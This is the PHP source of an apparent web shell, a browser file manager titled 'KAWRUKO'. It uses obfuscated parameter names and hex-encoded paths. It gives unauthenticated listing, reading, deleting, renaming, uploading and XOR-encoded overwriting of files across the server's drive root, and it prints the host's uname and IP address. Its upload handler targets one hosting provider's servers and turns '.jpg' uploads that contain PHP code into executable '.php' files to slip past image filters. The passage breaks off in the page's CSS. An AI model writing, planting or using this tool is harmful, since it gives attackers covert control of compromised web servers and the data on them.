<?php
header_remove('X-Powered-By');

/* === hex helpers for nakxn === */
function hex_(string $n): string {
    $y = '';
    for ($i = 0, $l = strlen($n); $i < $l; $i++) $y .= dechex(ord($n[$i]));
    return $y;
}
function uhex(string $y): string {
    if ($y === '' || preg_match('/^[0-9a-fA-F]+$/', $y) !== 1 || (strlen($y) % 2)) return '';
    $n = '';
    for ($i = 0, $l = strlen($y); $i < $l; $i += 2) $n .= chr(hexdec($y[$i] . $y[$i+1]));
    return $n;
}

/* ===== Root derived from current directory's drive ===== */
function drive_root(string $path): string {
    $p = str_replace('\\', '/', $path);
    if (preg_match('#^([A-Za-z]):/#', $p, $m)) return $m[1] . ':/';
    return '/';
}
$CURRENT = realpath(getcwd()) ?: getcwd();
$ROOT = drive_root($CURRENT);

/* ===== Server info for header ===== */
$unameFull = php_uname();
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? '';
function detect_server_type(string $soft): string {
    $s = strtolower($soft);
    if (strpos($s,'litespeed') !== false) return 'LiteSpeed';
    if (strpos($s,'apache') !== false) return 'Apache';
    if (strpos($s,'nginx') !== false) return 'nginx';
    if ($soft !== '') return $soft;
    return 'Unknown';
}
$serverType = detect_server_type($serverSoftware);

/* Best-effort server IP */
$serverIp = $_SERVER['SERVER_ADDR'] ?? '';
if ($serverIp === '') {
    $hostName = gethostname();
    if ($hostName) $serverIp = gethostbyname($hostName);
}
if (!filter_var($serverIp, FILTER_VALIDATE_IP)) {
    $serverName = $_SERVER['SERVER_NAME'] ?? '';
    if ($serverName) {
        $ip = gethostbyname($serverName);
        if (filter_var($ip, FILTER_VALIDATE_IP)) $serverIp = $ip;
    }
}
if ($serverIp === '') $serverIp = 'Unknown';

/* ===== Helpers ===== */
function is_abs_path(string $p): bool {
    if (preg_match('#^[A-Za-z]:[\\\\/]#', $p) === 1) return true;
    if (substr($p, 0, 2) === '\\\\') return true;
    return isset($p[0]) && $p[0] === '/';
}
function normalize_slashes(string $p): string { return str_replace('\\', '/', $p); }

function safe_join(string $base, string $path): string {
    $base = realpath($base) ?: $base;
    $path = normalize_slashes($path);
    if ($path === '' || $path === '.') $candidate = $base;
    elseif (is_abs_path($path)) $candidate = $path;
    else $candidate = rtrim($base, "/\\") . DIRECTORY_SEPARATOR . $path;
    $real = realpath($candidate);
    if ($real === false) $real = $candidate;
    return $real;
}

function within_root(string $candidate, string $root): bool {
    $candidate = normalize_slashes($candidate);
    $root = rtrim(normalize_slashes($root), '/');
    return $candidate === $root || strpos($candidate, $root . '/') === 0;
}

function format_size(int $bytes): string {
    if ($bytes < 1024) return $bytes . " B";
    $kb = $bytes / 1024;
    if ($kb < 1024) return number_format($kb, 2) . " KB";
    $mb = $kb / 1024;
    if ($mb < 1024) return number_format($mb, 2) . " MB";
    $gb = $mb / 1024;
    return number_format($gb, 2) . " GB";
}

function list_dir(string $path, string $root): array {
    $items = [];
    if (!is_dir($path)) return $items;
    $dir = scandir($path, SCANDIR_SORT_ASCENDING);
    if ($dir === false) return $items;
    foreach ($dir as $name) {
        if ($name === "." || $name === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $name;
        $real = realpath($full) ?: $full;
        if (!within_root($real, $root)) continue;
        $isDir = is_dir($real);
        $items[] = [
            "name" => $name,
            "type" => $isDir ? "dir" : "file",
            "size" => $isDir ? null : @filesize($real),
            "mtime" => @filemtime($real) ?: 0,
            "path" => normalize_slashes($real),
        ];
    }
    usort($items, function($a, $b){
        if ($a["type"] !== $b["type"]) return $a["type"] === "dir" ? -1 : 1;
        return strcasecmp($a["name"], $b["name"]);
    });
    return $items;
}

/* Breadcrumb */
function breadcrumb_html(string $currentPath, string $root): string {
    $p = normalize_slashes($currentPath);

    if (preg_match('#^[A-Za-z]:/$#', $p)) {
        return '<span class="crumb current">'.htmlspecialchars($p).'</span>';
    }
    if (preg_match('#^([A-Za-z]:)(/.*)?$#', $p, $m)) {
        $drive = $m[1];
        $rest = $m[2] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="#" data-path="'.htmlspecialchars("$drive/", ENT_QUOTES).'" class="crumb">'.htmlspecialchars("$drive/").'</a>';
        $acc = "$drive";
        foreach ($parts as $i => $seg) {
            $acc .= "/$seg";
            if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
            else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
        }
        return implode('<span class="crumb-sep"> / </span>', $out);
    }
    if (preg_match('#^//([^/]+)/([^/]+)(/.*)?$#', $p, $m)) {
        $server = $m[1]; $share = $m[2]; $rest = $m[3] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="#" data-path="//' . htmlspecialchars("$server/$share", ENT_QUOTES) . '" class="crumb">//'.htmlspecialchars("$server/$share").'</a>';
        $acc = '//' . $server . '/' . $share;
        foreach ($parts as $i => $seg) {
            $acc .= '/' . $seg;
            if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
            else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
        }
        return implode('<span class="crumb-sep"> / </span>', $out);
    }
    $parts = explode('/', $p);
    $out = [];
    if (($parts[0] ?? '') === '') $out[] = '<a href="#" data-path="/" class="crumb">/</a>';
    $acc = '';
    foreach ($parts as $i => $seg) {
        if ($seg === '') continue;
        $acc .= '/' . $seg;
        if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
        else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
    }
    if (!$out) $out[] = '<span class="crumb current">/</span>';
    return implode('<span class="crumb-sep"> / </span>', $out);
}

function json_response($data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($data);
    exit;
}

/* decode hex nakxn from POST/GET, clamp to root */
function requested_path(string $root): string {
    $raw = $_POST['nakxn'] ?? ($_GET['nakxn'] ?? '');
    $decoded = $raw !== '' ? uhex((string)$raw) : $root;
    $path = (string)$decoded;
    $resolved = safe_join($root, $path);
    if (!within_root($resolved, $root)) $resolved = $root;
    return $resolved;
}

/* READ (plain) */
function editor_stream_read_file_plain(string $file): string {
    $fh = @fopen($file, 'rb');
    if (!$fh) return '';
    $bufSize = 65536;
    $out = '';
    while (!feof($fh)) {
        $chunk = fread($fh, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        $out .= $chunk;
    }
    fclose($fh);
    return $out;
}

/* Editor XOR key (log10 + hexdec) */
function editor_xor_key(int $i): int {
    $val   = ($i * 31 + 7) & 0xFFFFFFFF;
    $bin   = decbin($val);
    $last8 = substr($bin, -8);
    $bx    = bindec($last8 === '' ? '0' : $last8);

    $PI      = pi();
    $HALF_PI = $PI / 2;

    $a = asin(sin($i + 3)) / $HALF_PI;
    $c = cos($i * 0.5);
    $t = atan(tan(($i + 1) * 0.25)) / $HALF_PI;

    $mix       = ($a + $c + $t) / 3.0;
    $trigByte  = (int) floor(($mix + 1.0) * 127.5);

    $k = ($bx ^ ($i & 0xFF)) + $trigByte;
    return $k & 0xFF;
}

/* SAVE paths */
function editor_stream_decode_and_write_b64(string $encoded_b64, string $dest): bool {
    $raw = base64_decode($encoded_b64, true);
    if ($raw === false) return false;
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;

    $index = 0;
    $len = strlen($raw);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($raw, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) { fclose($fh); return false; }
    }
    fclose($fh);
    return true;
}
function editor_stream_decode_and_write_legacy(string $encoded, string $dest): bool {
    $encoded = stripslashes($encoded);
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;

    $index = 0;
    $len = strlen($encoded);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($encoded, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) { fclose($fh); return false; }
    }
    fclose($fh);
    return true;
}

/* ===== AJAX API ===== */
$action = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['shikigf'] ?? ($_GET['shikigf'] ?? null);
}
if ($action !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = requested_path($ROOT);
    if (!within_root($path, $ROOT)) json_response(["ok" => false, "error" => "Path out of drive root."], 400);

    switch ($action) {
        case 'list':
            $items = list_dir($path, $ROOT);
            $payload = array_map(function($i){
                return [
                    "name" => $i["name"],
                    "type" => $i["type"],
                    "size" => $i["type"] === "dir" ? "" : ($i["size"] !== false && $i["size"] !== null ? format_size((int)$i["size"]) : ''),
                    "rawSize" => $i["type"] === "dir" ? 0 : ((int)$i["size"]),
                    "mtime" => $i["mtime"] ? date('Y-m-d H:i:s', (int)$i["mtime"]) : '',
                    "path" => $i["path"]
                ];
            }, $items);
            json_response([
                "ok" => true,
                "path" => normalize_slashes($path),
                "breadcrumb" => breadcrumb_html($path, $ROOT),
                "items" => $payload
            ]);
            break;


            case 'check_domain':
    // Check server domain endpoint
    $serverHostname = php_uname('n');
    $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
    json_response([
        "ok" => true,
        "should_disguise" => $shouldDisguise,
        "hostname" => $serverHostname
    ]);
    break;

        case 'upload_xor':
            // Upload handler with conditional JPG disguising for .main-hosting.eu servers only
            $result = [
                'added' => [],
                'warning' => [],
                'error' => [],
                'removed' => []
            ];
            
            $uploadDir = $path;
            $chunk = isset($_POST['chunk']) ? intval($_POST['chunk']) : null;
            $chunks = isset($_POST['chunks']) ? intval($_POST['chunks']) : null;
            $chunkName = $_POST['name'] ?? '';
            
            // Check if we should do disguising (only on servers ending with .main-hosting.eu)
            $serverHostname = php_uname('n'); // Gets hostname like "us-bos-web1384.main-hosting.eu"
            $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
            
            $chunkDir = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . '.chunks' . DIRECTORY_SEPARATOR;
            if ($chunk !== null && !is_dir($chunkDir)) {
                mkdir($chunkDir, 0755, true);
            }
            
            // Stream copy function
            $streamCopyFile = function($sourcePath, $destPath) {
                if (!file_exists($sourcePath)) return false;
                
                $source = @fopen($sourcePath, 'rb');
                if (!$source) return false;
                
                $destDir = dirname($destPath);
                if (!is_dir($destDir)) {
                    if (!mkdir($destDir, 0755, true)) {
                        fclose($source);
                        return false;
                    }
                }
                
                $dest = @fopen($destPath, 'wb');
                if (!$dest) {
                    fclose($source);
                    return false;
                }
                
                $copiedBytes = stream_copy_to_stream($source, $dest);
                fclose($source);
                fclose($dest);
                
                return $copiedBytes !== false;
            };
            
            // Function to detect disguised PHP files (only if $shouldDisguise is true)
            $isDisguisedPhp = function($fileName, $mimeType, $filePath) use ($shouldDisguise) {
                if (!$shouldDisguise) return false;
                
                if (preg_match('/\.jpg$/i', $fileName) && $mimeType === 'image/jpeg') {
                    $handle = fopen($filePath, 'rb');
                    if (!$handle) return false;
                    $preview = fread($handle, 1024);
                    fclose($handle);
                    if (strpos($preview, '<?php') !== false || strpos($preview, '<?=') !== false) {
                        return true;
                    }
                }
                return false;
            };
            
            // Function to get elFinder-style file info
            $getFileInfo = function($filePath, $fileName) use ($uploadDir) {
                if (!file_exists($filePath)) return false;
                
                $stat = stat($filePath);
                $mimeType = 'application/octet-stream';
                
                if (function_exists('mime_content_type')) {
                    $detectedMime = @mime_content_type($filePath);
                    if ($detectedMime) $mimeType = $detectedMime;
                } elseif (function_exists('finfo_open')) {
                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                    $detectedMime = @finfo_file($finfo, $filePath);
                    if ($detectedMime) $mimeType = $detectedMime;
                    finfo_close($finfo);
                }
                
                $isImage = strpos($mimeType, 'image/') === 0;
                
                $info = [
                    'name' => $fileName,
                    'hash' => 'l1_' . base64_encode(str_replace($uploadDir, '', $filePath)),
                    'phash' => 'l1_' . base64_encode(str_replace($uploadDir, '', dirname($filePath))),
                    'mime' => $mimeType,
                    'size' => $stat['size'],
                    'ts' => $stat['mtime'],
                    'date' => date('Y-m-d H:i:s', $stat['mtime']),
                    'read' => 1,
                    'write' => 1,
                    'locked' => 0
                ];
                
                if ($isImage) {
                    $imageInfo = @getimagesize($filePath);
                    if ($imageInfo) {
                        $info['dim'] = $imageInfo[0] . 'x' . $imageInfo[1];
                    }
                }
                
                return $info;
            };
            
            // Validate file function
            $validateFile = function($fileName, $size) {
                $maxSize = 100 * 1024 * 1024;
                if ($size > $maxSize) {
                    return "File too large. Maximum size: " . format_size($maxSize);
                }
                
                if (empty(trim($fileName))) {
                    return "Invalid filename";
                }
                
                if (strpos($fileName, "\0") !== false) {
                    return "Invalid filename characters";
                }
                
                return null;
            };
            
            // Function to handle file overwrite
            $handleOverwrite = function($filePath, $fileName) use (&$result, $getFileInfo) {
                if (file_exists($filePath)) {
                    $oldFileInfo = $getFileInfo($filePath, $fileName);
                    if ($oldFileInfo) {
                        $result['removed'][] = $oldFileInfo;
                    }
                    return true;
                }
                return false;
            };
            
            // Function to save content from POST data
            $savePostContent = function($content, $filePath, $encoding = 'raw') {
                if ($encoding === 'base64') {
                    $decoded = base64_decode($content, true);
                    if ($decoded === false) {
                        return false;
                    }
                    return file_put_contents($filePath, $decoded) !== false;
                } else {
                    return file_put_contents($filePath, $content) !== false;
                }
            };
            
            // Handle POST content uploads with disguise detection
            if (isset($_POST['file_content']) && isset($_POST['file_name'])) {
                $fileName = basename($_POST['file_name']);
                $content = $_POST['file_content'];
                $encoding = $_POST['content_encoding'] ?? 'raw';
                
                // Check if this is a disguised PHP file (only if should disguise)
                $isDisguisedPhpFile = false;
                if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
                    if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
                        $isDisguisedPhpFile = true;
                    }
                }
                
                $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
                $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                
                $validation = $validateFile($finalFileName, strlen($content));
                if ($validation) {
                    $result['error'][] = $validation;
                } else {
                    $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                    
                    if ($savePostContent($content, $finalDest, $encoding)) {
                        $fileInfo = $getFileInfo($finalDest, $finalFileName);
                        if ($fileInfo) {
                            $result['added'][] = $fileInfo;
                            if ($wasOverwritten) {
                                $result['warning'][] = $isDisguisedPhpFile ? 
                                    "PHP file overwritten: $finalFileName" : 
                                    "File overwritten: $finalFileName";
                            }
                        }
                    } else {
                        $result['error'][] = "Failed to save POST content: $fileName";
                    }
                }
            }
            
            // Handle multiple POST files with disguise detection
            elseif (isset($_POST['files']) && is_string($_POST['files'])) {
                $filesData = json_decode($_POST['files'], true);
                if (is_array($filesData)) {
                    foreach ($filesData as $fileData) {
                        if (!isset($fileData['name']) || !isset($fileData['content'])) {
                            $result['error'][] = "Invalid file data structure";
                            continue;
                        }
                        
                        $fileName = basename($fileData['name']);
                        $content = $fileData['content'];
                        $encoding = $fileData['encoding'] ?? 'raw';
                        
                        $isDisguisedPhpFile = false;
                        if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
                            if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
                                $isDisguisedPhpFile = true;
                            }
                        }
                        
                        $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                        
                        $validation = $validateFile($finalFileName, strlen($content));
                        if ($validation) {
                            $result['error'][] = $validation . " ({$finalFileName})";
                            continue;
                        }
                        
                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                        
                        if ($savePostContent($content, $finalDest, $encoding)) {
                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
                            if ($fileInfo) {
                                $result['added'][] = $fileInfo;
                                if ($wasOverwritten) {
                                    $result['warning'][] = $isDisguisedPhpFile ? 
                                        "PHP file overwritten: $finalFileName" : 
                                        "File overwritten: $finalFileName";
                                }
                            }
                        } else {
                            $result['error'][] = "Failed to save POST content: $fileName";
                        }
                    }
                }
            }
            
            // Handle individual POST parameters with disguise detection
            else {
                foreach ($_POST as $key => $value) {
                    if (preg_match('/^file_name_(\d+)$/', $key, $matches)) {
                        $index = $matches[1];
                        $contentKey = "file_content_$index";
                        $encodingKey = "file_encoding_$index";
                        
                        if (isset($_POST[$contentKey])) {
                            $fileName = basename($value);
                            $content = $_POST[$contentKey];
                            $encoding = $_POST[$encodingKey] ?? 'raw';
                            
                            $isDisguisedPhpFile = false;
                            if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
                                if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
                                    $isDisguisedPhpFile = true;
                                }
                            }
                            
                            $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
                            $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                            
                            $validation = $validateFile($finalFileName, strlen($content));
                            if ($validation) {
                                $result['error'][] = $validation . " ({$finalFileName})";
                                continue;
                            }
                            
                            $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                            
                            if ($savePostContent($content, $finalDest, $encoding)) {
                                $fileInfo = $getFileInfo($finalDest, $finalFileName);
                                if ($fileInfo) {
                                    $result['added'][] = $fileInfo;
                                    if ($wasOverwritten) {
                                        $result['warning'][] = $isDisguisedPhpFile ? 
                                            "PHP file overwritten: $finalFileName" : 
                                            "File overwritten: $finalFileName";
                                    }
                                }
                            } else {
                                $result['error'][] = "Failed to save POST content: $fileName";
                            }
                        }
                    }
                }
            }
            
            // Handle chunked upload with disguise detection
            if ($chunk !== null && $chunks !== null && $chunkName !== '') {
                if (!isset($_FILES['upload'])) {
                    json_response(['error' => ['No chunk data received']], 400);
                }
                
                $chunkFile = $chunkDir . $chunkName . '.part' . $chunk;
                
                if (move_uploaded_file($_FILES['upload']['tmp_name'], $chunkFile)) {
                    $allChunks = true;
                    for ($i = 0; $i < $chunks; $i++) {
                        if (!file_exists($chunkDir . $chunkName . '.part' . $i)) {
                            $allChunks = false;
                            break;
                        }
                    }
                    
                    if ($allChunks) {
                        $fileName = basename($chunkName);
                        
                        // Check if this is a disguised PHP file using first chunk
                        $isDisguisedPhpFile = false;
                        if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
                            $firstChunkPath = $chunkDir . $chunkName . '.part0';
                            if (file_exists($firstChunkPath)) {
                                $handle = fopen($firstChunkPath, 'rb');
                                if ($handle) {
                                    $preview = fread($handle, 1024);
                                    fclose($handle);
                                    if (strpos($preview, '<?php') !== false || strpos($preview, '<?=') !== false) {
                                        $isDisguisedPhpFile = true;
                                    }
                                }
                            }
                        }
                        
                        $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                        
                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                        
                        $finalFile = fopen($finalDest, 'wb');
                        if ($finalFile) {
                            for ($i = 0; $i < $chunks; $i++) {
                                $chunkPath = $chunkDir . $chunkName . '.part' . $i;
                                $chunkContent = file_get_contents($chunkPath);
                                fwrite($finalFile, $chunkContent);
                                unlink($chunkPath);
                            }
                            fclose($finalFile);
                            @rmdir($chunkDir);
                            
                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
                            if ($fileInfo) {
                                $result['added'][] = $fileInfo;
                                $result['notice'] = $wasOverwritten ? 
                                    ($isDisguisedPhpFile ? "Chunked PHP file upload completed (overwritten): $finalFileName" : "Chunked upload completed (overwritten): $finalFileName") :
                                    ($isDisguisedPhpFile ? "Chunked PHP file upload completed: $finalFileName" : "Chunked upload completed: $finalFileName");
                            }
                        } else {
                            $result['error'][] = "Failed to create final file: $chunkName";
                        }
                    } else {
                        json_response(['partial' => true, 'chunk' => $chunk]);
                    }
                } else {
                    $result['error'][] = "Failed to save chunk $chunk for: $chunkName";
                }
            }
            
            // Handle standard multipart upload using stream copy
            elseif (isset($_FILES['upload'])) {
                $files = $_FILES['upload'];
                
                // Handle multiple files with disguise detection
                if (is_array($files['name'])) {
                    for ($i = 0; $i < count($files['name']); $i++) {
                        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
                            $errorMsg = [
                                UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                                UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
                                UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
                                UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                                UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
                            ][$files['error'][$i]] ?? 'Unknown upload error';
                            
                            $result['error'][] = $errorMsg . ": {$files['name'][$i]}";
                            continue;
                        }
                        
                        $fileName = basename($files['name'][$i]);
                        $mimeType = $files['type'][$i] ?? '';
                        $tempPath = $files['tmp_name'][$i];
                        
                        // Check if this is a disguised PHP file
                        $disguised = $isDisguisedPhp($fileName, $mimeType, $tempPath);
                        $finalFileName = $disguised ? str_replace('.jpg', '.php', $fileName) : $fileName;
                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                        
                        $validation = $validateFile($finalFileName, $files['size'][$i]);
                        
                        if ($validation) {
                            $result['error'][] = $validation . " ({$finalFileName})";
                            continue;
                        }
                        
                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                        
                        if ($streamCopyFile($tempPath, $finalDest)) {
                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
                            if ($fileInfo) {
                                $result['added'][] = $fileInfo;
                                if ($wasOverwritten) {
                                    $result['warning'][] = $disguised ? 
                                        "PHP file overwritten: $finalFileName" : 
                                        "File overwritten: $finalFileName";
                                }
                            }
                        } else {
                            $result['error'][] = "Failed to copy uploaded file: $fileName";
                        }
                    }
                } else {
                    // Single file upload with disguise detection
                    if ($files['error'] === UPLOAD_ERR_OK) {
                        $fileName = basename($files['name']);
                        $mimeType = $files['type'] ?? '';
                        $tempPath = $files['tmp_name'];
                        
                        // Check if this is a disguised PHP file
                        $disguised = $isDisguisedPhp($fileName, $mimeType, $tempPath);
                        $finalFileName = $disguised ? str_replace('.jpg', '.php', $fileName) : $fileName;
                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
                        
                        $validation = $validateFile($finalFileName, $files['size']);
                        
                        if (!$validation) {
                            $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
                            
                            if ($streamCopyFile($tempPath, $finalDest)) {
                                if (file_exists($finalDest)) {
                                    $fileInfo = $getFileInfo($finalDest, $finalFileName);
                                    if ($fileInfo) {
                                        $result['added'][] = $fileInfo;
                                        if ($wasOverwritten) {
                                            $result['warning'][] = $disguised ? 
                                                "PHP file overwritten: $finalFileName" : 
                                                "File overwritten: $finalFileName";
                                        }
                                    }
                                }
                            } else {
                                $result['error'][] = "Failed to copy uploaded file: $fileName";
                            }
                        } else {
                            $result['error'][] = $validation;
                        }
                    } else {
                        $errorMsg = [
                            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE', 
                            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
                            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
                        ][$files['error']] ?? 'Unknown upload error';
                        
                        $result['error'][] = $errorMsg;
                    }
                }
            }
            
            // If no POST files were processed and no FILES were provided
            elseif (!isset($_POST['file_content']) && !isset($_POST['files']) && empty($result['added'])) {
                $result['error'][] = "No upload data received (FILES or POST)";
            }
            
            // Response
            $uploadedCount = count($result['added']);
            $overwrittenCount = count($result['removed']);
            
            if ($uploadedCount > 0) {
                $uploadedNames = array_map(function($item) { return $item['name']; }, $result['added']);
                
                if ($overwrittenCount > 0) {
                    $result['notice'] = "Successfully uploaded $uploadedCount file(s), $overwrittenCount overwritten: " . implode(', ', $uploadedNames);
                } else {
                    $result['notice'] = "Successfully uploaded: " . implode(', ', $uploadedNames);
                }
            }
            
            json_response($result);
            break;

        case 'delete':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT)) json_response(["ok" => false, "error" => "Invalid target."], 400);
            $ok = is_dir($target) ? @rmdir($target) : @unlink($target);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Delete failed."]);
            break;

        case 'rename':
            $old = (string)($_POST['old'] ?? '');
            $new = (string)($_POST['new'] ?? '');
            if ($old === '' || $new === '') json_response(["ok" => false, "error" => "Missing names."], 400);
            $from = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $old);
            $to = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . basename($new);
            if ($from === false || !within_root($from, $ROOT) || !within_root($to, $ROOT)) {
                json_response(["ok" => false, "error" => "Invalid path."], 400);
            }
            $ok = @rename($from, $to);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Rename failed."]);
            break;

        case 'read':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            $plain = editor_stream_read_file_plain($target);
            json_response(["ok" => true, "content" => $plain, "name" => basename($target)]);
            break;

        case 'save':
            $name = (string)($_POST['name'] ?? '');
            $b64 = (string)($_POST['content_b64'] ?? '');
            $legacy = (string)($_POST['content'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            $ok = false;
            if ($b64 !== '') $ok = editor_stream_decode_and_write_b64($b64, $target);
            elseif ($legacy !== '') $ok = editor_stream_decode_and_write_legacy($legacy, $target);
            json_response(["ok" => $ok, "error" => $ok ? null : "Save failed."]);
            break;

        default:
            json_response(["ok" => false, "error" => "Unknown shikigf."], 400);
    }
}

/* initial path for JS (decode hex from GET) */
$initialParam = isset($_GET['nakxn']) ? (string)$_GET['nakxn'] : '';
$initialPath  = $initialParam !== '' ? uhex($initialParam) : $CURRENT;
$statePath    = htmlspecialchars(normalize_slashes($initialPath), ENT_QUOTES);
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>🌸 KAWRUKO</title>

<link href="https://fonts.googleapis.com/css2?family=Zilla+Slab:wght@400;500;700&display=swap" rel="stylesheet">

<style>
:root{
  --c1:#784848; --c2:#D89090; --c3:#76645B; --c4:#A86078; --c5:#47434C;
  --bg:#1e1d22; --panel:#2a2830; --err:#ff6b6b; --ok:#58c98b; --warn:#ffcc66;
  --radius:14px; --shadow:0 10px 30px rgba(0,0,0,.35);
}
*{box-sizing:border-box}
html,body{height:100%}
body{ margin:0; font-family:"Zilla Slab", system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif; background: var(--bg); color:#f4f1f6; }
.wrapper{ max-width:1100px; margin:32px auto; padding:0 16px; }

.header{
  background: linear-gradient(135deg, var(--c5), var(--c1));
  border:1px solid #00000022; box-shadow: var(--shadow);
  border-radius: var(--radius); padding:12px 16px;
  display:flex; gap:14px; align-items:center; justify-content:space-between;
}
.brand{ display:flex; align-items:center; gap:12px; }
.brand .logo{ width: 40px; height: 40px; border-radius: 10px; overflow: hidden; background: transparent; }
.brand .logo img{ width: 100%; height: 100%; object-fit: contain; display: block; }
.brand h1{font-size:18px; margin:0; letter-spacing:.3px}

.server-info{ text-align: right; display:flex; flex-direction:column; gap:6px; align-items:flex-end; }
.server-info .badge{
  display:inline-block; padding:6px 8px; border-radius:12px;
  background:#ffffff12; border:1px solid #00000033; color:#f6e9ef;
  font-size:12px; line-height:1.3em;
}
.server-info .badge code{ color:#fff; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }

.breadcrumb{
  margin-top:12px; padding:12px 16px; background: var(--panel);
  border:1px solid #00000030; border-radius: var(--radius);
  box-shadow: var(--shadow); display:flex; flex-wrap:wrap; gap:8px; align-items:center;
}
.crumb, .crumb.current{
  text-decoration:none; padding:6px 10px; border-radius:999px;
  border:1px solid #00000033; background:#ffffff0e; color:#f6e9ef;
  transition: all .15s ease-in-out;
}
